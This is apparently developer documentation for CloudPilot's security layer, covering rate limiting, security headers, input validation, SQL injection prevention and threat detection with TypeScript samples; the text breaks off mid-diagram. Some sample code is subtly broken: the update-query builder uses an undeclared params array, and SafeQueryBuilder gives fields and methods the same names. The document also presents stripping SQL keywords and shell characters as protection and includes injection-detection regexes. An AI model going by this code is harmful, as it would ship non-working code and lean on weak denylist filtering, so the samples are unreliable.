# Security Enhancements Documentation

**Version:** 1.0  
**Last Updated:** October 31, 2025  
**Status:** ✅ Production Ready

---

## Table of Contents

1. [Security Overview](#security-overview)
2. [Rate Limiting Configuration](#rate-limiting-configuration)
3. [Security Headers Setup](#security-headers-setup)
4. [Input Validation Guide](#input-validation-guide)
5. [SQL Injection Prevention](#sql-injection-prevention)
6. [Threat Detection](#threat-detection)
7. [Security Monitoring](#security-monitoring)
8. [Best Practices](#best-practices)
9. [Compliance Features](#compliance-features)
10. [Troubleshooting Guide](#troubleshooting-guide)

---

## Security Overview

The CloudPilot application implements a comprehensive, multi-layered security architecture designed to protect against common web application vulnerabilities and advanced threats.

### Core Security Components

#### 1. **Security Configuration Manager** (`/server/security.config.ts`)
- Centralized security settings management
- Environment-specific configurations
- Real-time threat detection and response
- Security health monitoring and metrics
- Automated compliance enforcement

#### 2. **Middleware Protection Stack**
- **Security Headers Middleware** (`/server/middleware/securityHeaders.ts`)
- **Rate Limiting Middleware** (`/server/middleware/rateLimiter.ts`)
- **Input Validation Middleware** (`/server/middleware/validation.ts`)
- **Audit Middleware** (`/server/middleware/audit.ts`)

#### 3. **Security Utilities**
- **SQL Protection** (`/server/utils/sqlProtection.ts`)
- **Secrets Management** (`/server/secrets-manager.ts`)
- **Rotation Service** (`/server/secrets-rotation.ts`)

### Security Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                     Client Requests                         │
└─────────────────────┬───────────────────────────────────────┘
                      │
┌─────────────────────▼───────────────────────────────────────┐
│              Middleware Security Stack                      │
│  ┌─────────────┐ ┌─────────────┐ ┌─────────────┐ ┌─────────┐ │
│  │ Security    │ │ Rate        │ │ Input       │ │ Audit   │ │
│  │ Headers     │ │ Limiter     │ │ Validation  │ │ Logger  │ │
│  └─────────────┘ └─────────────┘ └─────────────┘ └─────────┘ │
└─────────────────────┬───────────────────────────────────────┘
                      │
┌─────────────────────▼───────────────────────────────────────┐
│             Application Logic Layer                         │
│  ┌─────────────┐ ┌─────────────┐ ┌─────────────┐           │
│  │ Auth        │ │ SQL         │ │ Threat      │           │
│  │ Middleware  │ │ Protection  │ │ Detection   │           │
│  └─────────────┘ └─────────────┘ └─────────────┘           │
└─────────────────────┬───────────────────────────────────────┘
                      │
┌─────────────────────▼───────────────────────────────────────┐
│              Data & External Services                       │
│  ┌─────────────┐ ┌─────────────┐ ┌─────────────┐           │
│  │ Database    │ │ Secrets     │ │ External    │           │
│  │ (Encrypted) │ │ Manager     │ │ APIs        │           │
│  └─────────────┘ └─────────────┘ └─────────────┘           │
└─────────────────────────────────────────────────────────────┘
```

### Security Features

✅ **Multi-layered Defense**: Security applied at multiple levels  
✅ **Real-time Monitoring**: Continuous security health checks  
✅ **Automated Threat Detection**: Pattern matching and behavioral analysis  
✅ **Rate Limiting**: Multiple tiers with environment-specific limits  
✅ **Input Sanitization**: Comprehensive validation and cleaning  
✅ **SQL Injection Prevention**: Parameterized queries and sanitization  
✅ **Security Headers**: Complete HTTP security header suite  
✅ **Secrets Management**: Centralized, validated, and rotatable secrets  
✅ **Audit Logging**: Comprehensive security event tracking  
✅ **Compliance Ready**: SOC2, ISO27001, and GDPR support  

### Security Event Types

The system tracks and responds to these security events:

- `AUTHENTICATION_FAILURE` - Failed login attempts
- `AUTHORIZATION_FAILURE` - Permission violations
- `THREAT_DETECTED` - Malicious input patterns
- `ANOMALY_DETECTED` - Behavioral anomalies
- `RATE_LIMIT_EXCEEDED` - Request limit violations
- `SUSPICIOUS_ACTIVITY` - Unusual user behavior
- `SECURITY_VIOLATION` - Policy violations
- `AUDIT_LOG_EVENT` - Audit trail events
- `COMPLIANCE_VIOLATION` - Compliance framework violations
- `DATA_BREACH_ATTEMPT` - Potential data exposure

---

## Rate Limiting Configuration

Rate limiting is implemented using a sliding window algorithm with support for multiple tiers and custom limiters.

### Configuration Structure

```typescript
interface RateLimiterConfig {
  windowMs: number;        // Time window in milliseconds
  max: number;             // Maximum requests allowed
  message: string;         // Error message when limit exceeded
  standardHeaders: boolean; // Return rate limit info in headers
  legacyHeaders: boolean;   // Show rate limit in legacy headers
}
```

### Default Configuration

#### Development Environment
```typescript
{
  default: {
    windowMs: 15 * 60 * 1000,  // 15 minutes
    max: 200,                   // 200 requests
    message: 'Rate limit exceeded',
    standardHeaders: true,
    legacyHeaders: false,
  },
  customLimiters: {
    login: {
      windowMs: 15 * 60 * 1000,
      max: 10,                  // 10 login attempts
      message: 'Too many login attempts',
    },
    api: {
      windowMs: 60 * 1000,
      max: 2000,                // 2000 API calls per minute
      message: 'API rate limit exceeded',
    },
    admin: {
      windowMs: 15 * 60 * 1000,
      max: 500,                 // Admin endpoints
    }
  }
}
```

#### Production Environment
```typescript
{
  default: {
    windowMs: 15 * 60 * 1000,
    max: 100,                   // Stricter limits
    message: 'Rate limit exceeded',
  },
  customLimiters: {
    login: {
      windowMs: 15 * 60 * 1000,
      max: 5,                   // Very strict login limits
      message: 'Too many login attempts',
    },
    api: {
      windowMs: 60 * 1000,
      max: 1000,
      message: 'API rate limit exceeded',
    },
    admin: {
      windowMs: 15 * 60 * 1000,
      max: 100,                 // Admin endpoints
    }
  }
}
```

### Usage in Middleware

```typescript
import { rateLimit } from './middleware/rateLimiter';

// Apply to specific routes
app.use('/api/auth/login', rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5,
  message: 'Too many login attempts'
}));

// Apply to API routes
app.use('/api', rateLimit({
  windowMs: 60 * 1000,
  max: 1000
}));

// Custom limiter
const customLimiter = createRateLimiter({
  windowMs: 60 * 1000,
  max: 100,
  keyGenerator: (req) => req.user?.id || req.ip
});

app.use('/api/sensitive', customLimiter);
```

### Rate Limiting Headers

The system includes standard and custom headers:

```
X-RateLimit-Limit: 100
X-RateLimit-Remaining: 95
X-RateLimit-Reset: 1635780000
X-RateLimit-Window: 900000
X-RateLimit-Type: api
```

### Advanced Configuration

#### Geographic Rate Limiting

```typescript
const geoLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: (req) => {
    const country = req.geo?.country;
    return country === 'US' ? 200 : 50;
  },
  keyGenerator: (req) => `${req.ip}:${req.geo?.country}`
});
```

#### User-Based Rate Limiting

```typescript
const userLimiter = rateLimit({
  windowMs: 60 * 1000,
  max: (req) => {
    const plan = req.user?.subscription?.plan;
    const limits = { free: 100, pro: 1000, enterprise: 10000 };
    return limits[plan] || limits.free;
  },
  keyGenerator: (req) => req.user?.id || req.ip
});
```

#### Dynamic Rate Limiting

```typescript
// Increase limits during high load
const dynamicLimiter = rateLimit({
  windowMs: 60 * 1000,
  max: (req) => {
    const serverLoad = getServerLoad();
    if (serverLoad > 0.8) return 50;
    if (serverLoad > 0.6) return 100;
    return 200;
  }
});
```

### Monitoring Rate Limits

```typescript
// Check rate limit status
app.get('/api/rate-limit/status', (req, res) => {
  const userKey = req.user?.id || req.ip;
  const status = rateLimiter.getStatus(userKey);
  
  res.json({
    allowed: status.allowed,
    remaining: status.remaining,
    resetTime: status.resetTime,
    totalRequests: status.total,
    windowMs: status.windowMs
  });
});
```

### Best Practices

1. **Tiered Limits**: Use different limits for different endpoint types
2. **User Context**: Include user ID in key generation for personalized limits
3. **Graceful Degradation**: Return meaningful error messages
4. **Monitoring**: Track rate limit hits and patterns
5. **Dynamic Adjustment**: Adjust limits based on usage patterns
6. **Documentation**: Document all rate limits for API consumers

---

## Security Headers Setup

Security headers are configured through the Security Headers Middleware to protect against common web vulnerabilities.

### Complete Header Configuration

```typescript
interface SecurityHeaders {
  // Core Security Headers
  'Strict-Transport-Security': string;
  'X-Content-Type-Options': string;
  'X-Frame-Options': string;
  'X-XSS-Protection': string;
  'Referrer-Policy': string;
  
  // Content Security Policy
  'Content-Security-Policy': string;
  
  // Additional Headers
  'Permissions-Policy': string;
  'Cross-Origin-Embedder-Policy': string;
  'Cross-Origin-Opener-Policy': string;
  'Cross-Origin-Resource-Policy': string;
}
```

### Content Security Policy (CSP)

#### Development Configuration
```typescript
const cspDev = {
  defaultSrc: ["'self'"],
  scriptSrc: ["'self'", "'unsafe-inline'", "'unsafe-eval'"],
  styleSrc: ["'self'", "'unsafe-inline'"],
  imgSrc: ["'self'", "data:", "https:"],
  connectSrc: ["'self'", "ws:", "wss:"],
  fontSrc: ["'self'"],
  objectSrc: ["'none'"],
  mediaSrc: ["'self'"],
  frameSrc: ["'none'"],
  baseUri: ["'self'"],
  formAction: ["'self'"],
};
```

#### Production Configuration
```typescript
const cspProd = {
  defaultSrc: ["'self'"],
  scriptSrc: ["'self'"], // No unsafe-inline in production
  styleSrc: ["'self'", "'unsafe-inline'"],
  imgSrc: ["'self'", "data:", "https:"],
  connectSrc: ["'self'"],
  fontSrc: ["'self'"],
  objectSrc: ["'none'"],
  mediaSrc: ["'self'"],
  frameSrc: ["'none'"],
  baseUri: ["'self'"],
  formAction: ["'self'"],
  frameAncestors: ["'none'"],
  upgradeInsecureRequests: [],
};
```

### HTTP Strict Transport Security (HSTS)

```typescript
// Production - Maximum security
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

// Development - Disabled
Strict-Transport-Security: max-age=0
```

### Additional Security Headers

```typescript
// Prevent MIME-type sniffing
X-Content-Type-Options: nosniff

// Prevent clickjacking
X-Frame-Options: DENY

// XSS Protection
X-XSS-Protection: 1; mode=block

// Referrer Policy
Referrer-Policy: strict-origin-when-cross-origin

// Permissions Policy
Permissions-Policy: camera=(), microphone=(), geolocation=()

// Cross-Origin Policies
Cross-Origin-Embedder-Policy: require-corp
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Resource-Policy: same-origin
```

### Implementation

```typescript
import { securityHeaders } from './middleware/securityHeaders';

// Apply to all responses
app.use(securityHeaders());

// Custom CSP for specific routes
app.get('/admin', (req, res, next) => {
  res.setHeader('Content-Security-Policy', "default-src 'self'; script-src 'self' 'unsafe-inline'");
  next();
}, adminHandler);
```

### Testing Security Headers

```bash
# Using curl
curl -I https://your-domain.com

# Using securityheaders.com
curl -s https://securityheaders.com/?q=https://your-domain.com

# Using nmap
nmap --script http-security-headers -p 443 your-domain.com
```

### Expected Headers Response

```http
HTTP/1.1 200 OK
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
X-XSS-Protection: 1; mode=block
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: camera=(), microphone=(), geolocation=()
Cross-Origin-Embedder-Policy: require-corp
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Resource-Policy: same-origin
```

### Common Issues and Solutions

#### CSP Violations

```javascript
// Browser console will show violations
// Refine CSP based on actual usage
document.addEventListener('securitypolicyviolation', (e) => {
  console.log('CSP Violation:', {
    blockedURI: e.blockedURI,
    violatedDirective: e.violatedDirective,
    originalPolicy: e.originalPolicy
  });
});
```

#### Mixed Content Issues

```typescript
// Ensure all resources use HTTPS
const mixedContentPolicy = {
  ...cspProd,
  upgradeInsecureRequests: [] // Automatically upgrade HTTP to HTTPS
};
```

---

## Input Validation Guide

Input validation is implemented through a comprehensive middleware that validates, sanitizes, and secures all user input.

### Validation Schema Structure

```typescript
interface ValidationRule {
  field: string;
  type: 'string' | 'number' | 'email' | 'url' | 'boolean';
  required?: boolean;
  minLength?: number;
  maxLength?: number;
  min?: number;
  max?: number;
  pattern?: RegExp;
  enum?: any[];
  custom?: (value: any) => boolean | string;
}
```

### Built-in Validation Schemas

#### User Registration
```typescript
const userRegistrationSchema = {
  email: {
    type: 'email',
    required: true,
    pattern: /^[^\s@]+@[^\s@]+\.[^\s@]+$/,
    maxLength: 255
  },
  password: {
    type: 'string',
    required: true,
    minLength: 12,
    maxLength: 128,
    custom: (value) => {
      // Check complexity
      const hasUpper = /[A-Z]/.test(value);
      const hasLower = /[a-z]/.test(value);
      const hasNumber = /\d/.test(value);
      const hasSpecial = /[!@#$%^&*(),.?":{}|<>]/.test(value);
      
      if (!hasUpper || !hasLower || !hasNumber || !hasSpecial) {
        return 'Password must contain uppercase, lowercase, number, and special character';
      }
      return true;
    }
  },
  firstName: {
    type: 'string',
    required: true,
    minLength: 1,
    maxLength: 50,
    pattern: /^[a-zA-Z\s-']+$/
  },
  lastName: {
    type: 'string',
    required: true,
    minLength: 1,
    maxLength: 50,
    pattern: /^[a-zA-Z\s-']+$/
  }
};
```

#### Login Request
```typescript
const loginSchema = {
  email: {
    type: 'email',
    required: true,
    maxLength: 255
  },
  password: {
    type: 'string',
    required: true,
    minLength: 1,
    maxLength: 128
  }
};
```

#### API Request with Pagination
```typescript
const paginatedRequestSchema = {
  page: {
    type: 'number',
    required: false,
    min: 1,
    max: 1000,
    default: 1
  },
  limit: {
    type: 'number',
    required: false,
    min: 1,
    max: 100,
    default: 10
  },
  sortBy: {
    type: 'string',
    required: false,
    enum: ['createdAt', 'updatedAt', 'name', 'id'],
    default: 'createdAt'
  },
  sortOrder: {
    type: 'string',
    required: false,
    enum: ['asc', 'desc'],
    default: 'desc'
  }
};
```

### Input Sanitization

#### HTML Sanitization
```typescript
function sanitizeHtml(input: string): string {
  return input
    .replace(/<script[^>]*>.*?<\/script>/gi, '') // Remove script tags
    .replace(/<iframe[^>]*>.*?<\/iframe>/gi, '') // Remove iframes
    .replace(/javascript:/gi, '') // Remove javascript: protocol
    .replace(/on\w+="[^"]*"/gi, '') // Remove event handlers
    .replace(/<[^>]*>/g, ''); // Remove all HTML tags
}
```

#### SQL Injection Sanitization
```typescript
function sanitizeSql(input: string): string {
  return input
    .replace(/[';\\]/g, '') // Remove dangerous characters
    .replace(/\b(SELECT|INSERT|UPDATE|DELETE|DROP|CREATE|ALTER|EXEC|UNION|SCRIPT)\b/gi, '') // Remove SQL keywords
    .replace(/--/g, '') // Remove SQL comments
    .replace(/\/\*/g, '') // Remove block comments start
    .replace(/\*\//g, ''); // Remove block comments end
}
```

#### Command Injection Sanitization
```typescript
function sanitizeCommand(input: string): string {
  return input
    .replace(/[;&|`$()]/g, '') // Remove command shell operators
    .replace(/&&/g, '') // Remove double ampersand
    .replace(/\|\|/g, '') // Remove double pipe
    .replace(/>/g, '') // Remove redirect
    .replace(/</g, '') // Remove redirect
    .replace(/\$/g, ''); // Remove dollar signs
}
```

### Validation Middleware Usage

```typescript
import { validateBody, validateQuery, validateParams } from './middleware/validation';

// Validate request body
app.post('/api/users', 
  validateBody(userRegistrationSchema),
  async (req, res) => {
    // req.body is validated and sanitized
    const { email, password, firstName, lastName } = req.body;
    // Process request...
  }
);

// Validate query parameters
app.get('/api/users',
  validateQuery(paginatedRequestSchema),
  async (req, res) => {
    const { page, limit, sortBy, sortOrder } = req.query;
    // Process request...
  }
);

// Validate route parameters
app.get('/api/users/:id',
  validateParams({
    id: {
      type: 'string',
      required: true,
      pattern: /^[a-zA-Z0-9-_]+$/
    }
  }),
  async (req, res) => {
    const { id } = req.params;
    // Process request...
  }
);
```

### File Upload Validation

```typescript
const fileUploadSchema = {
  file: {
    required: true,
    custom: (file) => {
      // Check file type
      const allowedTypes = ['image/jpeg', 'image/png', 'image/gif'];
      if (!allowedTypes.includes(file.mimetype)) {
        return 'Only JPEG, PNG, and GIF files are allowed';
      }
      
      // Check file size (5MB limit)
      const maxSize = 5 * 1024 * 1024;
      if (file.size > maxSize) {
        return 'File size must not exceed 5MB';
      }
      
      return true;
    }
  }
};
```

### Custom Validation Examples

#### Password Strength Validator
```typescript
const passwordStrengthValidator = (password: string): boolean | string => {
  const checks = {
    length: password.length >= 12,
    uppercase: /[A-Z]/.test(password),
    lowercase: /[a-z]/.test(password),
    number: /\d/.test(password),
    special: /[!@#$%^&*(),.?":{}|<>]/.test(password),
    common: !isCommonPassword(password)
  };
  
  const failedChecks = Object.entries(checks)
    .filter(([_, passed]) => !passed)
    .map(([check, _]) => check);
  
  if (failedChecks.length > 0) {
    return `Password failed: ${failedChecks.join(', ')}`;
  }
  
  return true;
};
```

#### Email Validator with Domain Check
```typescript
const emailValidator = (email: string): boolean | string => {
  // Basic format check
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  if (!emailRegex.test(email)) {
    return 'Invalid email format';
  }
  
  // Check for disposable email domains
  const disposableDomains = ['tempmail.org', '10minutemail.com', 'guerrillamail.com'];
  const domain = email.split('@')[1].toLowerCase();
  
  if (disposableDomains.includes(domain)) {
    return 'Disposable email addresses are not allowed';
  }
  
  return true;
};
```

### Validation Error Handling

```typescript
// Custom error response format
app.use((err: ValidationError, req: Request, res: Response, next: NextFunction) => {
  if (err.name === 'ValidationError') {
    const errors = err.details.map(detail => ({
      field: detail.path,
      message: detail.message,
      value: detail.context?.value
    }));
    
    return res.status(400).json({
      error: 'Validation failed',
      errors,
      timestamp: new Date().toISOString()
    });
  }
  
  next(err);
});
```

### Validation Rate Limiting

```typescript
// Prevent validation abuse
const validationLimiter = rateLimit({
  windowMs: 60 * 1000,
  max: 100, // 100 validation attempts per minute
  keyGenerator: (req) => req.ip + ':validation'
});

app.use('/api/', validationLimiter);
```

### Best Practices

1. **Validate All Input**: Every user input must be validated
2. **Use Strong Patterns**: Regex patterns should be specific and restrictive
3. **Sanitize Early**: Sanitize input as early as possible in the request pipeline
4. **Fail Securely**: Reject invalid input rather than trying to correct it
5. **Log Validation Failures**: Track validation failures for security monitoring
6. **Use Schema Validation**: Use libraries like Joi or Zod for complex validation
7. **Test Validation**: Include validation tests in your test suite

---

## SQL Injection Prevention

SQL injection prevention is implemented through multiple layers of protection, including input sanitization, parameterized queries, and query analysis.

### Defense Strategy

#### 1. Input Sanitization
```typescript
// /server/utils/sqlProtection.ts
export function sanitizeSqlInput(input: string): string {
  if (typeof input !== 'string') {
    throw new Error('Input must be a string');
  }
  
  return input
    // Escape dangerous characters
    .replace(/'/g, "''")     // SQL single quote
    .replace(/"/g, '""')     // SQL double quote
    .replace(/\\/g, '\\\\')  // Backslash
    .replace(/\0/g, '')      // Null byte
    
    // Remove SQL keywords
    .replace(/\b(SELECT|INSERT|UPDATE|DELETE|DROP|CREATE|ALTER|EXEC|UNION|EXECUTE|SCRIPT)\b/gi, '')
    
    // Remove SQL comments
    .replace(/--/g, '')      // Single-line comment
    .replace(/\/\*/g, '')    // Multi-line comment start
    .replace(/\*\//g, '')    // Multi-line comment end
    
    // Remove dangerous functions
    .replace(/\b(LOAD_FILE|INTO OUTFILE|INTO DUMPFILE)\b/gi, '');
}
```

#### 2. Parameterized Query Builders

##### Safe SELECT Query
```typescript
export function buildSafeSelectQuery(
  table: string,
  columns: string[],
  conditions?: Record<string, any>,
  options?: {
    limit?: number;
    offset?: number;
    orderBy?: string;
    orderDirection?: 'ASC' | 'DESC';
  }
): { query: string; params: any[] } {
  // Validate table name
  if (!/^[a-zA-Z_][a-zA-Z0-9_]*$/.test(table)) {
    throw new Error('Invalid table name');
  }
  
  // Validate columns
  const validColumns = columns.filter(col => /^[a-zA-Z_][a-zA-Z0-9_.]*$/.test(col));
  if (validColumns.length === 0) {
    throw new Error('No valid columns specified');
  }
  
  let query = `SELECT ${validColumns.join(', ')} FROM ${table}`;
  const params: any[] = [];
  
  // Add WHERE clause
  if (conditions && Object.keys(conditions).length > 0) {
    const whereClause = Object.keys(conditions)
      .map((key, index) => {
        if (!/^[a-zA-Z_][a-zA-Z0-9_.]*$/.test(key)) {
          throw new Error(`Invalid column name: ${key}`);
        }
        params.push(conditions[key]);
        return `${key} = $${index + 1}`;
      })
      .join(' AND ');
    
    query += ` WHERE ${whereClause}`;
  }
  
  // Add ORDER BY
  if (options?.orderBy) {
    if (!/^[a-zA-Z_][a-zA-Z0-9_.]*$/.test(options.orderBy)) {
      throw new Error('Invalid column name for ordering');
    }
    query += ` ORDER BY ${options.orderBy}`;
    if (options.orderDirection) {
      query += ` ${options.orderDirection.toUpperCase()}`;
    }
  }
  
  // Add LIMIT
  if (options?.limit !== undefined) {
    query += ` LIMIT $${params.length + 1}`;
    params.push(options.limit);
  }
  
  // Add OFFSET
  if (options?.offset !== undefined) {
    query += ` OFFSET $${params.length + 1}`;
    params.push(options.offset);
  }
  
  return { query, params };
}
```

##### Safe INSERT Query
```typescript
export function buildSafeInsertQuery(
  table: string,
  data: Record<string, any>
): { query: string; params: any[] } {
  // Validate table name
  if (!/^[a-zA-Z_][a-zA-Z0-9_]*$/.test(table)) {
    throw new Error('Invalid table name');
  }
  
  const columns = Object.keys(data);
  const validColumns = columns.filter(col => /^[a-zA-Z_][a-zA-Z0-9_.]*$/.test(col));
  
  if (validColumns.length === 0) {
    throw new Error('No valid columns specified');
  }
  
  const placeholders = validColumns.map((_, index) => `$${index + 1}`);
  const params = validColumns.map(col => data[col]);
  
  const query = `
    INSERT INTO ${table} (${validColumns.join(', ')})
    VALUES (${placeholders.join(', ')})
  `;
  
  return { query, params };
}
```

##### Safe UPDATE Query
```typescript
export function buildSafeUpdateQuery(
  table: string,
  data: Record<string, any>,
  conditions: Record<string, any>
): { query: string; params: any[] } {
  // Validate table name
  if (!/^[a-zA-Z_][a-zA-Z0-9_]*$/.test(table)) {
    throw new Error('Invalid table name');
  }
  
  // Build SET clause
  const setColumns = Object.keys(data);
  const validSetColumns = setColumns.filter(col => /^[a-zA-Z_][a-zA-Z0-9_.]*$/.test(col));
  
  if (validSetColumns.length === 0) {
    throw new Error('No valid columns specified for update');
  }
  
  const setClause = validSetColumns
    .map((col, index) => {
      params.push(data[col]);
      return `${col} = $${params.length}`;
    })
    .join(', ');
  
  // Build WHERE clause
  const whereColumns = Object.keys(conditions);
  const validWhereColumns = whereColumns.filter(col => /^[a-zA-Z_][a-zA-Z0-9_.]*$/.test(col));
  
  if (validWhereColumns.length === 0) {
    throw new Error('No valid conditions specified');
  }
  
  const whereClause = validWhereColumns
    .map((col, index) => {
      params.push(conditions[col]);
      return `${col} = $${params.length}`;
    })
    .join(' AND ');
  
  const query = `
    UPDATE ${table}
    SET ${setClause}
    WHERE ${whereClause}
  `;
  
  return { query, params };
}
```

#### 3. SafeQueryBuilder Class

```typescript
export class SafeQueryBuilder {
  private table: string;
  private allowedTables: string[];
  private selectColumns: string[] = [];
  private whereConditions: Array<{ column: string; operator: string; value: any }> = [];
  private orderBy?: { column: string; direction: 'ASC' | 'DESC' };
  private limit?: number;
  private offset?: number;
  
  constructor(table: string, allowedTables: string[] = []) {
    this.table = table;
    this.allowedTables = allowedTables;
    
    // Validate table access
    if (allowedTables.length > 0 && !allowedTables.includes(table)) {
      throw new Error(`Table '${table}' not in allowed tables list`);
    }
  }
  
  select(columns: string[]): this {
    // Validate columns
    const validColumns = columns.filter(col => /^[a-zA-Z_][a-zA-Z0-9_.]*$/.test(col));
    if (validColumns.length === 0) {
      throw new Error('No valid columns specified');
    }
    this.selectColumns = validColumns;
    return this;
  }
  
  where(column: string, operator: string, value: any): this {
    // Validate column name
    if (!/^[a-zA-Z_][a-zA-Z0-9_.]*$/.test(column)) {
      throw new Error(`Invalid column name: ${column}`);
    }
    
    // Validate operator
    const allowedOperators = ['=', '!=', '<', '>', '<=', '>=', 'LIKE', 'IN'];
    if (!allowedOperators.includes(operator.toUpperCase())) {
      throw new Error(`Invalid operator: ${operator}`);
    }
    
    this.whereConditions.push({ column, operator: operator.toUpperCase(), value });
    return this;
  }
  
  orderBy(column: string, direction: 'ASC' | 'DESC' = 'ASC'): this {
    if (!/^[a-zA-Z_][a-zA-Z0-9_.]*$/.test(column)) {
      throw new Error(`Invalid column name: ${column}`);
    }
    this.orderBy = { column, direction };
    return this;
  }
  
  limit(count: number): this {
    if (count < 1) {
      throw new Error('Limit must be greater than 0');
    }
    this.limit = count;
    return this;
  }
  
  offset(count: number): this {
    if (count < 0) {
      throw new Error('Offset must be non-negative');
    }
    this.offset = count;
    return this;
  }
  
  build(): { query: string; params: any[] } {
    let query = `SELECT ${this.selectColumns.join(', ')} FROM ${this.table}`;
    const params: any[] = [];
    
    // Add WHERE clause
    if (this.whereConditions.length > 0) {
      const whereClause = this.whereConditions
        .map((condition, index) => {
          params.push(condition.value);
          return `${condition.column} ${condition.operator} $${index + 1}`;
        })
        .join(' AND ');
      
      query += ` WHERE ${whereClause}`;
    }
    
    // Add ORDER BY
    if (this.orderBy) {
      query += ` ORDER BY ${this.orderBy.column} ${this.orderBy.direction}`;
    }
    
    // Add LIMIT
    if (this.limit !== undefined) {
      query += ` LIMIT $${params.length + 1}`;
      params.push(this.limit);
    }
    
    // Add OFFSET
    if (this.offset !== undefined) {
      query += ` OFFSET $${params.length + 1}`;
      params.push(this.offset);
    }
    
    return { query, params };
  }
}
```

### Usage Examples

#### Basic Query Building
```typescript
import { 
  buildSafeSelectQuery, 
  buildSafeInsertQuery, 
  buildSafeUpdateQuery,
  SafeQueryBuilder 
} from './utils/sqlProtection';

// Safe SELECT
const { query, params } = buildSafeSelectQuery(
  'users',
  ['id', 'name', 'email'],
  { status: 'active', role: 'user' },
  { limit: 10, orderBy: 'createdAt', orderDirection: 'DESC' }
);

// Safe INSERT
const insertResult = buildSafeInsertQuery('users', {
  name: 'John Doe',
  email: 'john@example.com',
  status: 'active'
});

// Using SafeQueryBuilder
const queryBuilder = new SafeQueryBuilder('users', ['users', 'posts'])
  .select(['id', 'name', 'email'])
  .where('status', '=', 'active')
  .where('role', '=', 'user')
  .orderBy('createdAt', 'DESC')
  .limit(10);

const builtQuery = queryBuilder.build();
```

#### ORM Integration
```typescript
import { knex } from './database';

// Validate query components
function validateQuery(queryBuilder: any, allowedTables: string[]) {
  // Check table access
  const table = queryBuilder._single.table;
  if (!allowedTables.includes(table)) {
    throw new Error(`Access denied to table: ${table}`);
  }
  
  // Validate where clauses
  const whereClauses = queryBuilder._statements
    .filter((stmt: any) => stmt.type === 'where');
  
  for (const clause of whereClauses) {
    if (clause.column && !/^[a-zA-Z_][a-zA-Z0-9_.]*$/.test(clause.column)) {
      throw new Error(`Invalid column name: ${clause.column}`);
    }
  }
}

// Safe query execution
async function executeSafeQuery(queryBuilder: any, allowedTables: string[]) {
  validateQuery(queryBuilder, allowedTables);
  return await queryBuilder;
}
```

### SQL Injection Detection

```typescript
export function detectSqlInjection(input: string): boolean {
  const patterns = [
    /(\b(SELECT|INSERT|UPDATE|DELETE|DROP|CREATE|ALTER|EXEC|UNION|SCRIPT)\b)/i,
    /('|(\\x27)|(\\x22)|(\\x23))/,
    /(;|--|\/\*|\*\/)/,
    /(\bUNION\b)/i,
    /(\bSCRIPT\b)/i,
    /((\%27)|(\'))((\%6F)|o|(\%4F))((\%72)|r|(\%52))/i, // 'or' in various encodings
    /((\%27)|(\'))union/i,
    /exec(\s|\+)+(s|x)p\w+/i
  ];
  
  return patterns.some(pattern => pattern.test(input));
}

// Usage in middleware
export function sqlInjectionMiddleware(req: Request, res: Response, next: NextFunction) {
  const suspiciousInputs = [
    req.body,
    req.query,
    req.params
  ];
  
  for (const input of suspiciousInputs) {
    const jsonString = JSON.stringify(input);
    if (detectSqlInjection(jsonString)) {
      // Log security event
      createSecurityEvent({
        type: SecurityEventType.THREAT_DETECTED,
        severity: 'high',
        source: 'sql-injection-detection',
        description: 'Potential SQL injection detected',
        metadata: { input: jsonString.substring(0, 100) }
      });
      
      return res.status(400).json({
        error: 'Invalid input detected'
      });
    }
  }
  
  next();
}
```

### Database Configuration Security

```typescript
// Database configuration with security settings
const dbConfig = {
  client: 'postgresql',
  connection: process.env.DATABASE_URL,
  pool: {
    min: 2,
    max: 10,
    acquireTimeoutMillis: 60000,
    createTimeoutMillis: 30000,
    destroyTimeoutMillis: 5000,
    idleTimeoutMillis: 30000,
    reapIntervalMillis: 1000,
    createRetryIntervalMillis: 200
  },
  // Security settings
  migrations: {
    tableName: 'knex_migrations',
    directory: './migrations'
  },
  // Connection security
  ssl: process.env.NODE_ENV === 'production' ? {
    rejectUnauthorized: true,
    ca: fs.readFileSync('./certs/ca.pem').toString(),
    key: fs.readFileSync('./certs/client-key.pem').toString(),
    cert: fs.readFileSync('./certs/client-cert.pem').toString()
  } : false
};
```

### Best Practices

1. **Always Use Parameterized Queries**: Never concatenate strings to build SQL
2. **Validate Input**: Sanitize and validate all user input
3. **Use ORMs**: Prefer ORMs with built-in SQL injection protection
4. **Limit Permissions**: Database user should have minimal required permissions
5. **Audit Queries**: Log all database queries for security monitoring
6. **Regular Updates**: Keep database drivers and libraries updated
7. **Test Protection**: Include SQL injection tests in your test suite
8. **Monitor Access**: Track unusual database access patterns

---

## Threat Detection

The threat detection system uses pattern matching, behavioral analysis, and anomaly detection to identify and respond to security threats in real-time.

### Detection Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                  Threat Detection Engine                     │
├─────────────────────────────────────────────────────────────┤
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐         │
│  │ Pattern     │  │ Behavioral  │  │ Anomaly     │         │
│  │ Matching    │  │ Analysis    │  │ Detection   │         │
│  └─────────────┘  └─────────────┘  └─────────────┘         │
├─────────────────────────────────────────────────────────────┤
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐         │
│  │ SQL         │  │ XSS         │  │ CSRF        │         │
│  │ Injection   │  │ Detection   │  │ Detection   │         │
│  └─────────────┘  └─────────────┘  └─────────────┘         │
├─────────────────────────────────────────────────────────────┤
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐         │
│  │ Path        │  │ Command     │  │ Malware     │         │
│  │ Traversal   │  │ Injection   │  │ Detection   │         │
│  └─────────────┘  └─────────────┘  └─────────────┘         │
└─────────────────────────────────────────────────────────────┘
                      │
┌─────────────────────▼───────────────────────────────────────┐
│                Response Actions                              │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐         │
│  │ Auto-block  │  │ Log Event   │  │ Alert       │         │
│  │ Request     │  │ Security    │  │ Admin       │         │
